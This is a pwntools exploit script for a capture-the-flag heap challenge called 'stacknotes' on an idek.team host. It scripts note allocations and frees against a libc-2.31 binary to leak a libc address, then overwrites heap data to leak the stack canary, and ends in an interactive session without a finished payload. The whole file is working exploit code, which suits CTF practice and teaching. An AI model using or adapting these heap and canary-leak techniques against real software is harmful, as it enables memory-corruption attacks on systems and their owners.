#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host stacknotes.chal.idek.team --port 1337 stacknotes
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('stacknotes')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'stacknotes.chal.idek.team'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *main+763
b *main+425
b *main+1008
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()
libc = ELF('./libc-2.31.so')

def add(idx, size):
    io.sendline('c')
    io.sendline(str(idx))
    io.sendline(str(size))

def delete(idx):
    io.sendline('d')
    io.sendline(str(idx))

def edit(idx, content):
    io.sendline('w')
    io.sendline(str(idx))
    io.sendline(content)

def view(idx):
    io.sendline('v')
    io.sendline(str(idx))

add(0, 0x440)
add(1, 0x208)

delete(0)
add(0, 0x208)

view(0)

io.recvuntil(b'Note:\n')
leak = u64(io.recvn(6)+b'\x00'*2)
libc.address = leak - libc.sym['__malloc_hook'] & ~0xfff
print("Leak: ", hex(libc.address))

add(2, 0x208)
add(3, 0x208)
edit(3, b'A'*8 + p64(0x210)[:-1])

delete(2)
add(0, 0x208)
edit(0, b'A'*0x18)
view(0)
io.recvuntil(b'A'*0x18)
canary = int.from_bytes(io.recvn(8), 'little')
print("Canary:    ", hex(canary))

io.interactive()

